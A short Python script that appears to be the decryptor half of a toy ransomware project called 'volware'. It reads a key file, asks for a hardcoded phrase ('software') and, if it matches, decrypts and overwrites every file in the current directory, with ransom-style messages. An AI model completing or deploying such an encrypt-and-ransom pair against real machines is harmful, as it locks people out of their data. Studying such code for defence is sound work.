#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet

#Let's find some files



files = []


for file in os.listdir():
	if file == "volware.py" or file == "thekey.key" or file == "decrypt.py" :
		continue
	if os.path.isfile(file):
		files.append(file)

print(files)

with open("thekey.key","rb") as key:
	secret_key = key.read()


secret_phrase = "software"

user_phrase = input("Enter the secret phrase to decrypt your files\n=>")



if user_phrase == secret_phrase:

	for file in files:
		with open(file,"rb") as thefile:
			contents = thefile.read()
		contents_decrypted = Fernet(secret_key).decrypt(contents)
		with open(file,"wb") as thefile:
			thefile.write(contents_decrypted)
		print("Congrats,Your files decrypted :> Be Happy")
else:
	print("Sorry,Try Again:(")

